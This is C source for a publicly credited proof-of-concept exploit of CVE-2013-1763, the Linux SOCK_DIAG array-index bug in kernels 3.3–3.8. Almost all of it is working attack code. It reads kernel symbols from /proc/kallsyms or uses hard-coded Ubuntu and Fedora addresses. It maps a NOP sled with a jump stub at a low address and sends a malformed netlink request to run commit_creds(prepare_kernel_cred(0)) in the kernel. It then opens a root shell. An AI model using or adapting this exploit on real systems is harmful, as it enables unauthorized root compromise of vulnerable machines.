/*
* quick'n'dirty poc for CVE-2013-1763 SOCK_DIAG bug in kernel 3.3-3.8
* bug found by Spender
* poc by SynQ
*
* hard-coded for 3.5.0-17-generic #28-Ubuntu SMP Tue Oct 9 19:32:08 UTC 2012 i686 i686 i686 GNU/Linux
* using nl_table->hash.rehash_time, index 81
*
* Fedora 18 support added
*
* 2/2013
*/
 
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/filter.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sock_diag.h>
#include <linux/inet_diag.h>
#include <linux/unix_diag.h>
#include <sys/mman.h>
 
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long sock_diag_handlers, nl_table;
 
int __attribute__((regparm(3)))
kernel_code()
{
    commit_creds(prepare_kernel_cred(0));
    return -1;
}
 
int jump_payload_not_used(void *skb, void *nlh)
{
	// X86 Only
    asm volatile (
        "mov $kernel_code, %eax\n"
        "call *%eax\n"
    );
//    asm volatile (
//        "mov $kernel_code, %rax\n"
//        "call *%rax\n"
//    );
}
 
unsigned long
get_symbol(char *name)
{
    FILE *f;
    unsigned long addr;
    char dummy, sym[512];
    int ret = 0;
  
    f = fopen("/proc/kallsyms", "r");
    if (!f) {
        return 0;
    }
  
    while (ret != EOF) {
        ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
        if (ret == 0) {
            fscanf(f, "%s\n", sym);
            continue;
        }
        if (!strcmp(name, sym)) {
            printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
            fclose(f);
            return addr;
        }
    }
    fclose(f);
  
    return 0;
}
 
int main(int argc, char*argv[])
{
    int fd;
    unsigned family;
    struct {
        struct nlmsghdr nlh;
        struct unix_diag_req r;
    } req;
    char    buf[8192];
 
    if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) < 0){
        printf("Can't create sock diag socket\n");
        return -1;
    }
 
    memset(&req, 0, sizeof(req));
    req.nlh.nlmsg_len = sizeof(req);
    req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
    req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
    req.nlh.nlmsg_seq = 123456;
 
    //req.r.sdiag_family = 89;
    req.r.udiag_states = -1;
    req.r.udiag_show = UDIAG_SHOW_NAME | UDIAG_SHOW_PEER | UDIAG_SHOW_RQLEN;
 
    if(argc==1){
        printf("Run: %s Fedora|Ubuntu\n",argv[0]);
        return 0;
    }
    else if(strcmp(argv[1],"Fedora")==0){
      commit_creds = (_commit_creds) get_symbol("commit_creds");
      prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
      sock_diag_handlers = get_symbol("sock_diag_handlers");
      nl_table = get_symbol("nl_table");
       
      if(!prepare_kernel_cred || !commit_creds || !sock_diag_handlers || !nl_table){
        printf("some symbols are not available!\n");
        exit(1);
        }
 
      family = (nl_table - sock_diag_handlers) / 4;
      printf("family=%d\n",family);
      req.r.sdiag_family = family;
       
      if(family>255){
        printf("nl_table is too far!\n");
        exit(1);
        }
    }
    else if(strcmp(argv[1],"Ubuntu")==0){
      commit_creds = (_commit_creds) 0xc106bc60;
      prepare_kernel_cred = (_prepare_kernel_cred) 0xc106bea0;
      req.r.sdiag_family = 81;
    }
 
    unsigned long mmap_start, mmap_size;
    mmap_start = 0x10000;
    mmap_size = 0x120000;
    printf("mmapping at 0x%lx, size = 0x%lx\n", mmap_start, mmap_size);
 
        if (mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,
                MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {
                printf("mmap fault\n");
                exit(1);
        }
    memset((void*)mmap_start, 0x90, mmap_size);
 
    char jump[] = "\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3"; // jump_payload in asm
    unsigned long *asd = &jump[4];
    *asd = (unsigned long)kernel_code;
 
    memcpy( (void*)mmap_start+mmap_size-sizeof(jump), jump, sizeof(jump));
 
    if ( send(fd, &req, sizeof(req), 0) < 0) {
        printf("bad send\n");
        close(fd);
        return -1;
    }
 
    printf("uid=%d, euid=%d\n",getuid(), geteuid() );
 
    if(!getuid())
        system("/bin/sh");
 
}